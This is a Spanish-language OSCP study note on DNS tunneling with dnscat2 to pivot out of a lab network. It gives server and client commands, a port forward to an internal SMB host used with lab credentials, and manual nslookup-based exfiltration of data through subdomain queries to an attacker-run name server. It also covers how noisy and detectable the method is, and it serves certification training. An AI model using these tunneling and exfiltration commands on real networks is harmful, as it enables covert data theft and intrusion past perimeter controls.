---
tipo: tecnica
fase: pivoting
so: linux
tags: [oscp, tecnica, pivoting, linux]
---

# DNS Tunneling con dnscat2

> [!abstract] Qué es y cuándo usarla
> Tuneliza tráfico dentro de consultas/respuestas **DNS**: exfiltra datos en el **subdominio** de las queries e infiltra datos en respuestas **TXT/CNAME/MX**. Úsala cuando el host interno **no tiene salida directa** pero su **resolver DNS** sí reenvía a tu name server autoritativo externo. Lento y muy ruidoso, pero atraviesa perímetros que solo permiten DNS.

## Requisitos previos
- Un **dominio** con tu máquina como **authoritative name server** (en el lab: `feline.corp` → FELINEAUTHORITY).
- Que el resolver del target reenvíe `*.tudominio` hasta tu servidor (UDP/53 libre).
- Vector de **ejecución previo** para dejar el client dnscat2 en el host (no resuelve el "chicken-or-egg"; es solo transporte).

## Pasos
```bash
# 1) Server en el authoritative NS (matar dnsmasq antes; usa UDP/53)
dnscat2-server feline.corp               # imprime --secret; crea sesión al conectar el client

# 2) Client en el host comprometido
./dnscat feline.corp                     # usa TXT/CNAME/MX; verifica que la auth string coincide

# 3) Interactuar desde el server
# dnscat2> windows                       # listar sesiones
# dnscat2> window -i 1                    # entrar a la command session
# command (host) 1> listen 127.0.0.1:4455 172.16.2.11:445   # port forward (como ssh -L)

# 4) Usar el forward
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

### Fundamentos con Dnsmasq (manual, sin dnscat2)
```bash
sudo dnsmasq -C dnsmasq.conf -d          # authoritative mínimo: auth-zone/auth-server=feline.corp
# exfil: nslookup <dato>.feline.corp      (el subdominio ES el dato; la query llega al NS)
# infil: txt-record=www.feline.corp,<dato>  -> nslookup -type=txt www.feline.corp
sudo tcpdump -i ens192 udp port 53       # observar las queries
```

> [!warning] Detección / problemas
> - **No sigiloso**: avalancha de queries CNAME/TXT/MX, evidente en cualquier IDS/tcpdump.
> - **Lento**: TCP (p.ej. SMB) encapsulado en DNS/UDP.
> - Sin `--secret` precompartido, compara la **auth string** en ambos extremos (anti-tampering); cambia por conexión.
> - `resolvectl flush-caches` si recibes respuestas DNS cacheadas/antiguas.

## Visto en
- Módulo: [[20 - Tunneling Through Deep Packet Inspection]]
- Máquinas: [[]]
